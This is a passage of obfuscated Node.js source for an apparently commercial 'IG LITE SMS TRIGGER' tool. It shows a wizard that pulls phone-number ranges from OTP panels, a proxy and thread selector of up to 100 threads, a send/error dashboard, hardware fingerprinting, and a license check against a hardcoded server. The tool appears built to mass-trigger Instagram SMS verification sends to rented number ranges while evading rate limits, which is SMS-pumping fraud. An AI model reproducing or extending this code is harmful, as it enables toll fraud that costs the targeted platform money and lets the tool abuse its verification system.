        if (v289.includes("CSRF")) v324 = "CSRF Error persisted";
        if (v288.status === 429) v324 = "HTTP 429 Too Many Requests (Blocked)";
        if (v288.status === 403) v324 = "HTTP 403 Forbidden (Proxy Blocked / Limits)";
        if (v288.status === 400) v324 = "HTTP 400 Bad Request (Payload format incorrect)";
        const v325 = {};
        return v325.success = false, v325.message = "Failed: " + v324 + " - HTTP " + v288.status, v325.phone = v253, v325.langName = v262, v325.proxyCountryName = v266, v325.numberCountryName = v265, v325;
      }
    }
  } catch (v326) {
    {
      const v327 = v252 ? v252.host + ':' + v252.port + '\x20(' + (v252.user || "NoAuth") + ')' : "DIRECT",
        v328 = v326.code || v326.syscall || "UNKNOWN",
        v329 = {};
      v329.proxy = v327, dbg(v254, "💥 PROXY_ERROR " + v328, v326.message, v329);
      const v330 = {};
      return v330.success = false, v330.message = "Failed: Proxy/Network Error [" + v328 + ':\x20' + v326.message + ']', v330.phone = v253, v330.langName = "Unknown", v330.proxyCountryName = "Unknown", v330.numberCountryName = "Unknown", v330;
    }
  }
}
if (isMainThread) {
  class Dashboard {
    constructor(v331) {
      {
        this.totalNumbers = v331;
        this.processed = 0;
        this.successful = 0;
        this.failed = 0;
        this.startTime = Date.now();
      }
    }
    ["addLog"](v332, v333, v334 = '') {
      let v335 = '';
      if (v333 === "success") v335 = B("[IG-LITE] [SMS ✅]");else {
        if (v333 === "whatsapp") v335 = Y("[IG-LITE] [WA  💬]");else {
          if (v333 === "retry") v335 = Y("[RETRY  ]");else v335 = R("[ERROR  ]");
        }
      }
      const v336 = v335 + '\x20' + v332 + (v334 ? '\x20' + G(v334) : '');
      process.stdout.write("\r[K" + v336 + '\x0a');
      this.render();
    }
    ["setStatus"](v337) {}
    ["update"]() {}
    ["render"]() {
      const v338 = (this.processed / Math.max(this.totalNumbers, 1) * 100).toFixed(1),
        v339 = '\x20\x20' + W.bold("IG-LITE") + " ⮞ [" + this.processed + '/' + this.totalNumbers + ']\x20' + v338 + "% │ " + B("Sent: " + this.successful) + " │ " + R("Err: " + this.failed);
      process.stdout.write("\r[K" + v339);
    }
    ["stop"]() {
      process.stdout.write("[2K\r\n");
      const v340 = Math.floor((Date.now() - this.startTime) / 1000),
        v341 = Math.floor(v340 / 60);
      const v342 = v340 % 60;
      const v343 = v341 + 'm\x20' + v342 + 's';
      console.log(C("  ╔════════════════════════════════════════════╗")), console.log(C("  ║") + W.bold("  IG LITE SMS TRIGGER — COMPLETE            ") + C('║')), console.log(C("  ╠════════════════════════════════════════════╣"));
      console.log(C("  ║") + ('\x20\x20' + chalk.greenBright("Successful") + "   " + chalk.greenBright(String(this.successful).padStart(6)) + "                       ") + C('║')), console.log(C("  ║") + ('\x20\x20' + chalk.red("Failed") + "       " + chalk.red(String(this.failed).padStart(6)) + "                       ") + C('║')), console.log(C("  ║") + ('\x20\x20' + chalk.cyan("Total Time") + "   " + chalk.cyan(v343.padEnd(6)) + "                       ") + C('║')), console.log(C("  ╚════════════════════════════════════════════╝\n"));
    }
  }
  async function selectOption(v344, v345) {
    return new Promise(v346 => {
      let v347 = 0;
      process.stdin.resume(), readline.emitKeypressEvents(process.stdin);
      if (process.stdin.isTTY) process.stdin.setRawMode(true);
      const fn3 = () => {
        process.stdout.write("[2J[H");
        printHeader(), console.log("   [33m" + v344 + "[0m\n");
        v345.forEach((v348, v349) => {
          if (v349 === v347) console.log("   [36m➔[32m " + v348.name + "[0m");else {
            console.log("     [90m" + v348.name + "[0m");
          }
        });
      };
      fn3();
      const fn4 = (v350, v351) => {
        {
          if (v351.ctrl && v351.name === 'c') process.exit(0);
          if (v351.name === 'up') {
            v347 = (v347 - 1 + v345.length) % v345.length, fn3();
          } else {
            if (v351.name === "down") {
              v347 = (v347 + 1) % v345.length, fn3();
            } else {
              if (v351.name === "return") {
                process.stdin.setRawMode(false), process.stdin.removeListener("keypress", fn4), v346(v345[v347].value);
              }
            }
          }
        }
      };
      process.stdin.on("keypress", fn4);
    });
  }
  async function promptText(v352, v353) {
    return new Promise(v354 => {
      process.stdout.write("   [33m" + v352 + "[0m ");
      let v355 = '';
      if (process.stdin.isTTY) process.stdin.setRawMode(false);
      process.stdin.resume();
      const fn5 = v356 => {
        {
          const v357 = v356.toString();
          if (v357.includes('\x0a') || v357.includes('\x0d')) {
            {
              process.stdin.removeListener("data", fn5), v355 += v357.split(/[\r\n]/)[0];
              let v358 = v355.trim();
              if (v358.startsWith('\x22') && v358.endsWith('\x22')) v358 = v358.slice(1, -1);else v358.startsWith('\x27') && v358.endsWith('\x27') && (v358 = v358.slice(1, -1));
              v354(v358 || v353);
            }
          } else v355 += v357;
        }
      };
      process.stdin.on("data", fn5);
    });
  }
  async function interactiveWizard() {
    let v359 = 1,
      v360 = "file";
    let v361 = "numbers.txt",
      v362 = null;
    let v363 = null,
      v364 = null,
      v365 = null,
      v366 = "none",
      v367 = 20;
    let v368 = 'en',
      v369 = '',
      v370 = [];
    let v371 = 50,
      v372 = "/api/v1/numbers/get";
    while (true) {
      {
        process.stdout.write("[2J[H"), printHeader();
        if (v359 === 1) {
          const v373 = await selectOption("SELECT NUMBER SOURCE", [{
            'name': "📁 Load from file (numbers.txt)",
            'value': "file"
          }, {
            'name': "🌐 Auto fetch from NexaOTP Panel",
            'value': "nexa"
          }, {
            'name': "⚡ Auto fetch from Voltx (2oo9)",
            'value': "voltx"
          }, {
            'name': "🔥 Auto fetch from Stex (2oo9)",
            'value': "stex"
          }, {
            'name': "📱 Auto fetch from SMS Bower",
            'value': "smsbower"
          }, {
            'name': "⚡ Auto fetch from Zenex",
            'value': "zenex"
          }, {
            'name': "❌ Exit Program",
            'value': "exit"
          }]);
          if (v373 === "exit") process.exit(0);
          v360 = v373, v359 = 2;
        } else {
          if (v359 === 2) {
            if (v360 === "file") {
              {
                const v374 = await selectOption("SELECT TARGET NUMBERS FILE", [{
                  'name': "✏️ Custom File Path",
                  'value': "custom"
                }, {
                  'name': "⬅️ Go Back to Number Source",
                  'value': "back"
                }]);
                if (v374 === "back") {
                  v359 = 1;
                  continue;
                }
                if (v374 === "custom") {
                  {
                    const v375 = await promptText("Enter Numbers File Path:", "numbers.txt");
                    if (v375.toLowerCase() === "back") continue;
                    v361 = v375;
                  }
                } else v361 = v374;
                if (!fs.existsSync(v361)) fs.writeFileSync(v361, '');
                v362 = null, v359 = 3;
              }
            } else {
              if (v360 === "voltx" || v360 === "stex") {
                {
                  const v376 = v360 === "voltx" ? "Voltx ⚡" : "Stex 🔥",
                    v377 = v360 === "voltx" ? VOLTX_KEY_FILE : STEX_KEY_FILE,
                    v378 = v360 === "voltx" ? TWOOO_VOLTX_GET : TWOOO_STEX_GET,
                    v379 = v360 === "voltx" ? TWOOO_VOLTX_CONSOLE : TWOOO_STEX_CONSOLE;
                  let v380 = '',
                    v381 = [],
                    v382 = 50,
                    v383 = false,
                    v384 = 1;
                  while (v384 <= 3 && !v383) {
                    {
                      process.stdout.write("[2J[H"), printHeader();
                      if (v384 === 1) {
                        {
                          if (fs.existsSync(v377)) {
                            {
                              v380 = fs.readFileSync(v377, "utf8").trim();
                              const v385 = await selectOption(v376 + " key found (" + v380.substring(0, 10) + "...)", [{
                                'name': "Use saved key",
                                'value': "use"
                              }, {
                                'name': "Enter new key",
                                'value': "new"
                              }, {
                                'name': "Remove saved key",
                                'value': "remove"
                              }, {
                                'name': "⬅️ Back",
                                'value': "back"
                              }]);
                              if (v385 === "back") {
                                {
                                  v383 = true;
                                  break;
                                }
                              }
                              if (v385 === "remove") fs.existsSync(v377) && fs.unlinkSync(v377), v380 = '';else v385 === "new" && (v380 = '');
                            }
                          }
                          if (!v380) {
                            {
                              const v386 = await promptText("Enter " + v376 + " API Key (mauthapi):", '');
                              if (v386.toLowerCase() === "back") {
                                {
                                  v383 = true;
                                  break;
                                }
                              }
                              v380 = v386;
                              const v387 = {};
                              v387.name = 'No', v387.value = 'no';
                              const v388 = await selectOption("Save key?", [{
                                'name': "Yes",
                                'value': "yes"
                              }, v387]);
                              if (v388 === "yes" && v380) fs.writeFileSync(v377, v380, "utf8");
                            }
                          }
                          if (v380) v384 = 2;
                        }
                      } else {
                        if (v384 === 2) {
                          const v389 = {};
                          v389.name = "✏️  Enter manually", v389.value = "manual";
                          const v390 = await selectOption("How to select ranges?", [{
                            'name': "🔍 Auto Range Finder (scan console)",
                            'value': "auto"
                          }, v389, {
                            'name': "⬅️ Back",
                            'value': "back"
                          }]);
                          if (v390 === "back") {
                            {
                              v384 = 1;
                              continue;
                            }
                          }
                          if (v390 === "auto") {
                            const v391 = await autoRangeFinderFor2Oo(v380, v379, selectOption, promptText);
                            v391 && v391.length > 0 && (v381 = v391, v384 = 3);
                          } else {
                            v381 = [];
                            let v392 = true;
                            while (v392) {
                              {
                                const v393 = await promptText("Enter range #" + (v381.length + 1) + " (e.g. 26134XXX) or 'back':", '');
                                if (v393.toLowerCase() === "back") {
                                  {
                                    if (v381.length === 0) break;else {
                                      {
                                        v381.pop();
                                        continue;
                                      }
                                    }
                                  }
                                }
                                if (v393) v381.push(v393);
                                const v394 = {};
                                v394.name = 'No', v394.value = 'no';
                                const v395 = await selectOption("Added " + v381.length + ". Add another?", [{
                                  'name': "Yes",
                                  'value': "yes"
                                }, v394]);
                                if (v395 === 'no') v392 = false;
                              }
                            }
                            if (v381.length > 0) v384 = 3;
                          }
                        } else {
                          if (v384 === 3) {
                            const v396 = await promptText("How many numbers? [default:50]:", '50');
                            if (v396.toLowerCase() === "back") {
                              v384 = 2;
                              continue;
                            }
                            v382 = parseInt(v396) || 50;
                            const v397 = {};
                            v397.provider = v360, v397.apiKey = v380, v397.getPath = v378, v397.consolePath = v379, v397.ranges = v381, v397.totalCount = v382, v363 = v397, v362 = null, v384 = 4;
                          }
                        }
                      }
                    }
                  }
                  if (v383) {
                    {
                      v359 = 1;
                      continue;
                    }
                  }
                  v359 = 3;
                }
              } else {
                if (v360 === "smsbower") {
                  {
                    let v398 = '',
                      v399 = 'fb',
                      v400 = '0',
                      v401 = "0.5",
                      v402 = 50,
                      v403 = 1,
                      v404 = false;
                    while (v403 <= 4 && !v404) {
                      {
                        process.stdout.write("[2J[H"), printHeader();
                        if (v403 === 1) {
                          if (fs.existsSync(SMSBOWER_KEY_FILE)) {
                            {
                              v398 = fs.readFileSync(SMSBOWER_KEY_FILE, "utf8").trim();
                              const v405 = await selectOption("SMS Bower key found (" + v398.substring(0, 10) + "...)", [{
                                'name': "Use saved key",
                                'value': "use"
                              }, {
                                'name': "Enter new key",
                                'value': "new"
                              }, {
                                'name': "Remove saved key",
                                'value': "remove"
                              }, {
                                'name': "⬅️ Back",
                                'value': "back"
                              }]);
                              if (v405 === "back") {
                                v404 = true;
                                break;
                              }
                              if (v405 === "remove") fs.existsSync(SMSBOWER_KEY_FILE) && fs.unlinkSync(SMSBOWER_KEY_FILE), v398 = '';else {
                                if (v405 === "new") v398 = '';
                              }
                            }
                          }
                          if (!v398) {
                            {
                              v398 = await promptText("Enter SMS Bower API Key:", '');
                              if (v398.toLowerCase() === "back") {
                                {
                                  v404 = true;
                                  break;
                                }
                              }
                              const v406 = {};
                              v406.name = 'No', v406.value = 'no';
                              const v407 = await selectOption("Save key?", [{
                                'name': "Yes",
                                'value': "yes"
                              }, v406]);
                              if (v407 === "yes" && v398) fs.writeFileSync(SMSBOWER_KEY_FILE, v398, "utf8");
                            }
                          }
                          if (v398) v403 = 2;
                        } else {
                          if (v403 === 2) {
                            {
                              v399 = await promptText("Service code (e.g. fb, ig, wa) [default: ig]:", 'ig');
                              if (v399.toLowerCase() === "back") {
                                {
                                  v403 = 1;
                                  continue;
                                }
                              }
                              v399 = v399 || 'ig', v403 = 3;
                            }
                          } else {
                            if (v403 === 3) {
                              {
                                v400 = await promptText("Country code (0 = any) [default: 0]:", '0');
                                if (v400.toLowerCase() === "back") {
                                  v403 = 2;
                                  continue;
                                }
                                v400 = v400 || '0';
                                const v408 = await promptText("Max price per number [default: 0.5]:", "0.5");
                                v401 = v408 || "0.5", v403 = 4;
                              }
                            } else {
                              if (v403 === 4) {
                                const v409 = await promptText("How many numbers? [default: 50]:", '50');
                                if (v409.toLowerCase() === "back") {
                                  {
                                    v403 = 3;
                                    continue;
                                  }
                                }
                                v402 = parseInt(v409) || 50;
                                const v410 = {};
                                v410.apiKey = v398, v410.service = v399, v410.country = v400, v410.maxPrice = v401, v410.totalCount = v402, v364 = v410, v362 = null, v363 = null, v365 = null, v403 = 5;
                              }
                            }
                          }
                        }
                      }
                    }
                    if (v404) {
                      v359 = 1;
                      continue;
                    }
                    v359 = 3;
                  }
                } else {
                  if (v360 === "zenex") {
                    {
                      let v411 = '',
                        v412 = [],
                        v413 = 50,
                        v414 = 1,
                        v415 = false;
                      while (v414 <= 3 && !v415) {
                        {
                          process.stdout.write("[2J[H"), printHeader();
                          if (v414 === 1) {
                            if (fs.existsSync(ZENEX_KEY_FILE)) {
                              v411 = fs.readFileSync(ZENEX_KEY_FILE, "utf8").trim();
                              const v416 = await selectOption("Zenex key found (" + v411.substring(0, 10) + "...)", [{
                                'name': "Use saved key",
                                'value': "use"
                              }, {
                                'name': "Enter new key",
                                'value': "new"
                              }, {
                                'name': "Remove saved key",
                                'value': "remove"
                              }, {
                                'name': "⬅️ Back",
                                'value': "back"
                              }]);
                              if (v416 === "back") {
                                v415 = true;
                                break;
                              }
                              if (v416 === "remove") fs.existsSync(ZENEX_KEY_FILE) && fs.unlinkSync(ZENEX_KEY_FILE), v411 = '';else {
                                if (v416 === "new") v411 = '';
                              }
                            }
                            if (!v411) {
                              v411 = await promptText("Enter Zenex API Key (mapikey):", '');
                              if (v411.toLowerCase() === "back") {
                                v415 = true;
                                break;
                              }
                              const v417 = {};
                              v417.name = 'No', v417.value = 'no';
                              const v418 = await selectOption("Save key?", [{
                                'name': "Yes",
                                'value': "yes"
                              }, v417]);
                              if (v418 === "yes" && v411) fs.writeFileSync(ZENEX_KEY_FILE, v411, "utf8");
                            }
                            if (v411) v414 = 2;
                          } else {
                            if (v414 === 2) {
                              {
                                v412 = [];
                                let v419 = true;
                                while (v419) {
                                  const v420 = await promptText("Enter range #" + (v412.length + 1) + " (e.g. 4473845XXX) or 'back':", '');
                                  if (v420.toLowerCase() === "back") {
                                    {
                                      if (v412.length === 0) {
                                        v415 = true;
                                        break;
                                      } else {
                                        v412.pop();
                                        continue;
                                      }
                                    }
                                  }
                                  if (v420) v412.push(v420);
                                  const v421 = {};
                                  v421.name = "Yes", v421.value = "yes";
                                  const v422 = {};
                                  v422.name = 'No', v422.value = 'no';
                                  const v423 = await selectOption("Added " + v412.length + ". Add another?", [v421, v422]);
                                  if (v423 === 'no') v419 = false;
                                }
                                if (v412.length > 0) v414 = 3;
                              }
                            } else {
                              if (v414 === 3) {
                                {
                                  const v424 = await promptText("How many numbers? [default: 50]:", '50');
                                  if (v424.toLowerCase() === "back") {
                                    v414 = 2;
                                    continue;
                                  }
                                  v413 = parseInt(v424) || 50;
                                  const v425 = {};
                                  v425.apiKey = v411, v425.ranges = v412, v425.totalCount = v413, v365 = v425, v362 = null, v363 = null, v364 = null, v414 = 4;
                                }
                              }
                            }
                          }
                        }
                      }
                      if (v415) {
                        {
                          v359 = 1;
                          continue;
                        }
                      }
                      v359 = 3;
                    }
                  } else {
                    let v426 = 1,
                      v427 = false;
                    while (v426 <= 4 && !v427) {
                      {
                        process.stdout.write("[2J[H"), printHeader();
                        if (v426 === 1) {
                          if (fs.existsSync(NEXA_KEY_FILE)) {
                            {
                              v369 = fs.readFileSync(NEXA_KEY_FILE, "utf8").trim();
                              const v428 = await selectOption("Saved NexaOTP Key found (" + v369.substring(0, 10) + "...)", [{
                                'name': "Use saved key",
                                'value': "use"
                              }, {
                                'name': "Enter new key",
                                'value': "new"
                              }, {
                                'name': "Remove saved key",
                                'value': "remove"
                              }, {
                                'name': "⬅️ Go Back to Number Source",
                                'value': "back"
                              }]);
                              if (v428 === "back") {
                                {
                                  v427 = true;
                                  break;
                                }
                              }
                              if (v428 === "remove") {
                                {
                                  if (fs.existsSync(NEXA_KEY_FILE)) fs.unlinkSync(NEXA_KEY_FILE);
                                  v369 = '';
                                }
                              } else v428 === "new" && (v369 = '');
                            }
                          }
                          if (!v369) {
                            const v429 = await promptText("Enter NexaOTP API Key (type 'back' to go back):", '');
                            if (v429.toLowerCase() === "back") {
                              v427 = true;
                              break;
                            }
                            v369 = v429;
                            const v430 = {};
                            v430.name = 'No', v430.value = 'no';
                            const v431 = await selectOption("Save this key for future use?", [{
                              'name': "Yes, save it",
                              'value': "yes"
                            }, v430]);
                            if (v431 === "yes" && v369) {
                              fs.writeFileSync(NEXA_KEY_FILE, v369, "utf8");
                            }
                          }
                          if (v369) v426 = 2;
                        } else {
                          if (v426 === 2) {
                            v370 = [];
                            let v432 = true;
                            while (v432) {
                              const v433 = await promptText("Enter range #" + (v370.length + 1) + " (e.g. 21624485XXX) or type 'back':", '');
                              if (v433.toLowerCase() === "back") {
                                {
                                  if (v370.length === 0) {
                                    v426 = 1;
                                    break;
                                  } else {
                                    v370.pop();
                                    continue;
                                  }
                                }
                              }
                              if (v433) v370.push(v433);
                              const v434 = await selectOption("Added " + v370.length + " range(s). Add another?", [{
                                'name': "Yes, add another range",
                                'value': "yes"
                              }, {
                                'name': "No, proceed to next step",
                                'value': 'no'
                              }, {
                                'name': "⬅️ Go Back to API Key",
                                'value': "back"
                              }]);
                              if (v434 === "back") {
                                {
                                  v426 = 1;
                                  break;
                                }
                              }
                              if (v434 === 'no') v432 = false;
                            }
                            if (v370.length > 0) v426 = 3;
                          } else {
                            if (v426 === 3) {
                              {
                                const v435 = await promptText("How many numbers to process? (type 'back' to go back) [default: 50]:", '50');
                                if (v435.toLowerCase() === "back") {
                                  v426 = 2;
                                  continue;
                                }
                                v371 = parseInt(v435) || 50, v426 = 4;
                              }
                            } else {
                              if (v426 === 4) {
                                const v436 = await selectOption("SELECT NEXA SERVER", [{
                                  'name': "Server 1 (/get)",
                                  'value': "/api/v1/numbers/get"
                                }, {
                                  'name': "Server 2 (/p2/get)",
                                  'value': "/api/v1/numbers/p2/get"
                                }, {
                                  'name': "Server 3 (/p3/get)",
                                  'value': "/api/v1/numbers/p3/get"
                                }, {
                                  'name': "⬅️ Go Back to Count Input",
                                  'value': "back"
                                }]);
                                if (v436 === "back") {
                                  v426 = 3;
                                  continue;
                                }
                                v372 = v436;
                                const v437 = {};
                                v437.apiKey = v369, v437.ranges = v370, v437.totalCount = v371, v437.serverEndpoint = v372, v362 = v437, v426 = 5;
                              }
                            }
                          }
                        }
                      }
                    }
                    if (v427) {
                      {
                        v359 = 1;
                        continue;
                      }
                    }
                    v359 = 3;
                  }
                }
              }
            }
          } else {
            if (v359 === 3) {
              {
                const v438 = await selectOption("SELECT PROXIES FILE", [{
                  'name': "✏️ Custom File Path",
                  'value': "custom"
                }, {
                  'name': "🚫 None (Direct Connection)",
                  'value': "none"
                }, {
                  'name': "⬅️ Go Back to Numbers Selection",
                  'value': "back"
                }]);
                if (v438 === "back") {
                  {
                    v359 = 2;
                    continue;
                  }
                }
                if (v438 === "custom") {
                  const v439 = await promptText("Enter Proxies File Path:", "proxies.txt");
                  if (v439.toLowerCase() === "back") continue;
                  v366 = v439;
                } else v438 === "none" ? v366 = '' : v366 = v438;
                v359 = 4;
              }
            } else {
              if (v359 === 4) {
                const v440 = await selectOption("SELECT THREADS", [{
                  'name': "10 Threads",
                  'value': 0xa
                }, {
                  'name': "20 Threads (Default)",
                  'value': 0x14
                }, {
                  'name': "50 Threads (Fast)",
                  'value': 0x32
                }, {
                  'name': "100 Threads (Extreme)",
                  'value': 0x64
                }, {
                  'name': "⌨️ Custom...",
                  'value': "custom"
                }, {
                  'name': "⬅️ Go Back to Proxies Selection",
                  'value': "back"
                }]);
                if (v440 === "back") {
                  {
                    v359 = 3;
                    continue;
                  }
                }
                if (v440 === "custom") {
                  {
                    const v441 = await promptText("Enter custom number of threads (type 'back' to go back):", '20');
                    if (v441.toLowerCase() === "back") continue;
                    v367 = parseInt(v441) || 20;
                  }
                } else v367 = v440;
                v359 = 5;
              } else {
                if (v359 === 5) {
                  {
                    const v442 = {};
                    v442.name = "🇬🇧 Default (en_US)", v442.value = 'en';
                    const v443 = await selectOption("SELECT ACCEPT-LANGUAGE", [{
                      'name': "🌍 Auto Language (Match country code)",
                      'value': "auto"
                    }, v442, {
                      'name': "✏️ Custom Input",
                      'value': "custom"
                    }, {
                      'name': "⬅️ Go Back to Threads Selection",
                      'value': "back"
                    }]);
                    if (v443 === "back") {
                      v359 = 4;
                      continue;
                    }
                    v368 = v443;
                    if (v368 === "custom") {
                      {
                        const v444 = await promptText("Enter custom Locale (type 'back' to go back):", "en_US");
                        if (v444.toLowerCase() === "back") continue;
                        v368 = v444;
                      }
                    }
                    v359 = 6;
                  }
                } else {
                  if (v359 === 6) break;
                }
              }
            }
          }
        }
      }
    }
    return process.stdin.pause(), {
      'numbersFile': v361,
      'threads': String(v367),
      'proxiesFile': v366,
      'nexaConfig': v362,
      'twoOoConfig': v363,
      'smsBowerConfig': v364,
      'zenexConfig': v365,
      'languageOpt': v368
    };
  }
  function generateHWID() {
    const v445 = require('os');
    const v446 = v445.platform();
    try {
      if (v446 === "win32") {
        {
          const v447 = {};
          v447.stdio = "pipe", v447.timeout = 0x3a98;
          const v448 = execSync('powershell -NoProfile -Command "$mg = (Get-ItemProperty \'HKLM:\\SOFTWARE\\Microsoft\\Cryptography\' -ErrorAction SilentlyContinue).MachineGuid; $cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).ProcessorId; $disk = (Get-CimInstance Win32_LogicalDisk -Filter \'DeviceID=\\\'C:\\\'\' -ErrorAction SilentlyContinue).VolumeSerialNumber; $mb = (Get-CimInstance Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber; Write-Output (($mg,$cpu,$disk,$mb) -join \'|\')"', v447).toString().trim();
          if (!v448) throw new Error("No hardware data");
          const v449 = crypto.createHash("sha256").update(v448).digest("hex").toUpperCase();
          return "SKING-" + v449.substring(0, 8) + '-' + v449.substring(8, 12) + '-' + v449.substring(12, 16);
        }
      } else {
        {
          let v450 = [];
          try {
            {
              const v453 = execSync("settings get secure android_id 2>/dev/null || echo \"\"", {
                'stdio': "pipe",
                'timeout': 0x1388
              }).toString().trim();
              if (v453 && v453 !== "null") v450.push('A:' + v453);
            }
          } catch (v454) {}
          try {
            if (fs.existsSync("/proc/cpuinfo")) {
              {
                const v455 = fs.readFileSync("/proc/cpuinfo", "utf8"),
                  v456 = v455.match(/Serial\s*:\s*(\S+)/i),
                  v457 = v455.match(/Hardware\s*:\s*(.+)/i);
                if (v456 && v456[1] !== "0000000000000000") v450.push('S:' + v456[1].trim());
                if (v457) v450.push('H:' + v457[1].trim());
              }
            }
          } catch (v458) {}
          try {
            {
              if (fs.existsSync("/etc/machine-id")) {
                const v459 = fs.readFileSync("/etc/machine-id", "utf8").trim();
                if (v459) v450.push('M:' + v459);
              }
            }
          } catch (v460) {}
          try {
            {
              const v461 = v445.cpus(),
                v462 = v461 && v461.length > 0 ? v461[0].model : "UnknownCPU",
                v463 = v445.totalmem(),
                v464 = v445.release(),
                v465 = v445.hostname();
              v450.push('F:' + v462 + '|' + v463 + '|' + v464 + '|' + v465);
            }
          } catch (v466) {}
          const v451 = v450.join('||'),
            v452 = crypto.createHash("sha256").update(v451).digest("hex").toUpperCase();
          return "ANKING-" + v452.substring(0, 8) + '-' + v452.substring(8, 12) + '-' + v452.substring(12, 16);
        }
      }
    } catch (v467) {
      return '';
    }
  }
  function verifyServerSignature(v468, v469) {
    if (!v469) return false;
    const v470 = "-----BEGIN PUBLIC KEY-----\nMCowBQYDK2VwAyEAIU7Pc75ao+Fn7XGC7kFGeDh7JAs3o4NSL2LgmN0YmfY=\n-----END PUBLIC KEY-----";
    try {
      return crypto.verify(null, Buffer.from(v468, "utf8"), v470, Buffer.from(v469, "base64"));
    } catch (v471) {
      return false;
    }
  }
  async function start() {
    const v472 = process.argv.slice(2).filter(v502 => !v502.startsWith('--'));
    let v473 = '';
    v472[5] && v472[5] !== "SKING-UI-HARDWARE-ID" && (v473 = v472[5]);
    !v473 && (v473 = generateHWID());
    globalHwid = v473;
    if (!v473) {
      console.error(R("\n  ✗ Could not generate Hardware ID. Run on Windows.\n")), process.exit(1);
    }
    if (!v472[5] || v472[5] === "SKING-UI-HARDWARE-ID") {
      const v503 = generateHWID();
      v503 !== v473 && (console.error(R("\n  ✗ HWID integrity check failed. Tampering detected.\n")), process.exit(1));
    }
    let v474 = false,
      v475 = "Licensed";
    const v476 = Date.now();
    try {
      const v504 = "188.137.176.163",
        v505 = require("http"),
        v506 = "5.0.0",
        v507 = await new Promise((v508, v509) => {
          {
            const v510 = {};
            v510.hwid = v473, v510.app_id = "iglite", v510.version = v506, v510.timestamp = v476;
            const v511 = JSON.stringify(v510),
              v512 = {
                'hostname': v504,
                'port': 0xec1,
                'path': "/api/verify",
                'method': "POST",
                'headers': {
                  'Content-Type': "application/json",
                  'Content-Length': Buffer.byteLength(v511)
                },
                'timeout': 0x2710
              },
              v513 = v505.request(v512, v514 => {
                {
                  let v515 = '';
                  v514.on("data", v516 => v515 += v516), v514.on("end", () => {
                    try {
                      v508(JSON.parse(v515));
                    } catch (v517) {
                      v509(v517);
                    }
                  });
                }
              });
            v513.on("error", v509), v513.on("timeout", function () {
              this.destroy();
              v509(new Error("Timeout"));
            }), v513.write(v511), v513.end();
          }
        });
      if (v507) {
        {
          v507.status === "update_required" && (console.error(R("\n  ✗ Update required! Please download the latest version.\n")), process.exit(1));
          if (v507.status === "banned" || v507.status === "expired" || !v507.sig) {
            await new Promise(v521 => setTimeout(v521, 2000));
            let v520 = String(v507.reason || "NOT REGISTERED");
            if (!v507.reason && !v507.sig) v520 = "NOT REGISTERED / REMOVED";
            console.error(R("\n  ╔══════════════════════════════════════════════╗")), console.error(R("  ║    ✗ UNAUTHORIZED HARDWARE — IGLITE TOOL    ║")), console.error(R("  ╠══════════════════════════════════════════════╣")), console.error(R("  ║  HWID   : ") + Y(v473.padEnd(33)) + R('║')), console.error(R("  ║  Status : " + v520.padEnd(26) + '║')), console.error(R("  ║  Contact: t.me/Rex_OTP_Tool to register     ║")), console.error(R("  ╚══════════════════════════════════════════════╝\n")), process.exit(1);
          }
          const v518 = v473 + "|iglite|" + v506 + '|' + v476;
          !verifyServerSignature(v518, v507.sig) && (console.error(R("\n  ✗ Internal Server Error (500). Please try again later.\n")), process.exit(1));
          v474 = true;
          let v519 = v507.token;
          if (!v519) {
            console.error(R("\n  ✗ Invalid Server Response: Missing Active Session Token. Aborting.\n")), process.exit(1);
          }
          globalPingInterval = setInterval(() => {
            {
              !v519 && (console.error(R("\n  ✗ Session Token lost. Aborting...\n")), process.exit(1));
              const v522 = {};
              v522.hwid = v473, v522.app_id = "iglite", v522.token = v519;
              const v523 = JSON.stringify(v522),
                v524 = {
                  'hostname': v504,
                  'port': 0xec1,
                  'path': "/api/ping",
                  'method': "POST",
                  'headers': {
                    'Content-Type': "application/json",
                    'Content-Length': Buffer.byteLength(v523)
                  },
                  'timeout': 0x3a98
                },
                v525 = v505.request(v524, v526 => {
                  let v527 = '';
                  v526.on("data", v528 => v527 += v528);
                  v526.on("end", () => {
                    try {
                      const v529 = JSON.parse(v527);
                      v529.status === 'ok' && v529.token ? v519 = v529.token : (console.error(R("\n  ✗ Session invalidated by server (kill). Exiting...\n")), process.exit(1));
                    } catch (v530) {
                      console.error(R("\n  ✗ Network error during session ping. Exiting...\n")), process.exit(1);
                    }
                  });
                });
              v525.on("error", () => {
                console.error(R("\n  ✗ Disconnected from License Server. Exiting...\n")), process.exit(1);
              }), v525.on("timeout", function () {
                this.destroy();
                console.error(R("\n  ✗ License Server timeout. Exiting...\n"));
                process.exit(1);
              }), v525.write(v523), v525.end();
            }
          }, 25000);
          if (globalPingInterval && globalPingInterval.unref) globalPingInterval.unref();
        }
      }
    } catch (v531) {
      console.error(R("\n  ✗ License server is currently undergoing maintenance or is unreachable.")), console.error(R("    Please check your internet connection or try again later.\n")), process.exit(1);
    }
    !v474 && (console.error(R("\n  ✗ License verification failed. Exiting.\n")), process.exit(1));
    let v477 = v472,
      v478 = null,
      v479 = null,
      v480 = null,
      v481 = null,
      v482 = null;
    if (v477.length === 0) {
      v478 = await interactiveWizard();
    }
    let v483, v484, v485, v486;
    if (v478 && typeof v478 === "object" && !Array.isArray(v478)) {
      {
        v483 = path.resolve(v478.numbersFile || "numbers.txt");
        v484 = parseInt(v478.threads) || 20;
        v485 = v478.proxiesFile || '';
        if (v485.toLowerCase() === "none" || v485 === "false") v485 = '';
        v479 = v478.nexaConfig || null;
        v480 = v478.twoOoConfig || null;
        v481 = v478.smsBowerConfig || null;
        v482 = v478.zenexConfig || null;
        v486 = v478.languageOpt || 'en';
      }
    } else {
      {
        const v532 = v478 || v472;
        v483 = path.resolve(v532[0] || "numbers.txt"), v484 = parseInt(v532[1]) || 20, v485 = v532[2] !== undefined ? v532[2] : "proxies.txt";
        if (v485.toLowerCase() === "none" || v485 === "false") v485 = '';
        v486 = v532[3] || 'en';
      }
    }
    printHeader();
    console.log(B("  ✓ License: " + v475) + G(" | HWID: " + v473));
    let v487 = [],
      v488 = [],
      v489 = false,
      v490 = 0,
      v491 = 0,
      v492 = [];
    const v493 = v479 || v480 || v481 || v482;
    if (v479 || v480) {
      {
        const v533 = v479 ? "NexaOTP" : v480.provider === "voltx" ? "Voltx ⚡" : "Stex 🔥";
        console.log(Y("\n  [" + v533 + "] Streaming " + v493.totalCount + " numbers (" + v493.ranges.length + " range(s))...")), (async () => {
          {
            let v534 = 0,
              v535 = '';
